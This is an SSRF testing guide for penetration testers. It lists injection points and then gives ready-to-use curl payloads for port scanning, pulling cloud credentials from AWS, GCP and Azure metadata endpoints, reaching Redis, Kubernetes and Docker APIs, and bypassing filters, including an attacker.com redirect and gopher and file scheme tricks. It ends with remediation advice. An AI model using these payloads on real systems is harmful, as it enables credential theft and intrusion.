# Server-Side Request Forgery (SSRF) Testing Guide

## Overview

SSRF allows an attacker to make the server issue requests to unintended destinations,
potentially accessing internal services, cloud metadata, or other protected resources.
It is especially dangerous in cloud environments where metadata services expose credentials.

## Discovery

### Common Injection Points
- URL parameters that fetch remote resources (`url=`, `src=`, `href=`, `path=`)
- Webhook configuration endpoints
- PDF/image generators that accept URLs
- File import from URL features
- API integrations that proxy requests
- XML/SVG parsers (XXE-to-SSRF)

### Detection Payloads
```bash
# Basic SSRF test with external callback
curl "https://target.com/fetch?url=https://BURP_COLLABORATOR_URL"
# DNS-based detection
curl "https://target.com/fetch?url=http://UNIQUE_ID.oastify.com"
```

## Exploitation Techniques

### Internal Network Scanning
```bash
# Probe internal IP ranges
curl "https://target.com/fetch?url=http://192.168.1.1"
curl "https://target.com/fetch?url=http://10.0.0.1:8080"
curl "https://target.com/fetch?url=http://172.16.0.1"
# Port scanning via response timing or error differences
for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
  curl -s -o /dev/null -w "%{time_total} $port\n" \
    "https://target.com/fetch?url=http://127.0.0.1:$port"
done
```

### Cloud Metadata Access

#### AWS
```bash
# IMDSv1 (no token required)
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Get actual credentials
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
```

#### GCP
```bash
curl "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/" \
  -H "Metadata-Flavor: Google"
# Access token
curl "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

#### Azure
```bash
curl "https://target.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true"
```

### Internal Service Access
```bash
# Redis (if accessible)
curl "https://target.com/fetch?url=http://127.0.0.1:6379"
# Elasticsearch
curl "https://target.com/fetch?url=http://127.0.0.1:9200/_cluster/health"
# Kubernetes API
curl "https://target.com/fetch?url=https://kubernetes.default.svc/api/v1/namespaces"
# Docker API
curl "https://target.com/fetch?url=http://127.0.0.1:2375/containers/json"
```

## Filter Bypass Techniques

### URL Encoding
```
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
```

### Alternative IP Representations
```
http://127.0.0.1
http://0x7f000001          (hex)
http://2130706433           (decimal)
http://017700000001         (octal)
http://127.1                (shorthand)
http://0                    (resolves to 127.0.0.1 on some systems)
http://[::1]                (IPv6 loopback)
http://[0:0:0:0:0:ffff:127.0.0.1]  (IPv6-mapped IPv4)
```

### DNS Rebinding
```bash
# Use a DNS rebinding service
# First resolution: attacker IP (passes validation)
# Second resolution: 127.0.0.1 (hits internal service)
curl "https://target.com/fetch?url=http://A.B.C.D.1time.127.0.0.1.1time.repeat.rebind.network"
```

### Redirect-Based Bypass
```bash
# Host a redirect on attacker server
# Attacker server responds: 302 Location: http://169.254.169.254/latest/meta-data/
curl "https://target.com/fetch?url=http://attacker.com/redirect"
```

### Protocol Smuggling
```
# File protocol
file:///etc/passwd
# Gopher protocol (for crafting arbitrary TCP)
gopher://127.0.0.1:6379/_SET%20ssrf%20pwned
# Dict protocol
dict://127.0.0.1:6379/INFO
```

## Blind SSRF

When no response body is returned:
- Use out-of-band (OOB) interaction via Burp Collaborator or interactsh
- Observe response time differences for port scanning
- Check error messages for internal information leakage
- Chain with other vulnerabilities (e.g., write to internal service, then read via different path)

## Tools
- **Burp Suite** - intercept and modify SSRF payloads
- **SSRFmap** - automated SSRF detection and exploitation
- **Gopherus** - generate gopher payloads for exploiting internal services
- **interactsh** - OOB interaction server for blind SSRF detection
- **ffuf** - fuzz URL parameters for SSRF entry points

## Remediation
- Implement server-side URL allowlists (not blocklists)
- Disable unnecessary URL schemes (allow only http/https)
- Enforce IMDSv2 (token-based) on all cloud instances
- Use network-level controls to block metadata service access from application servers
- Validate and sanitize all user-supplied URLs
- Do not follow redirects from user-supplied URLs (or re-validate after redirect)
- Use a dedicated egress proxy with strict outbound rules
- Return generic error messages; do not expose internal responses to users
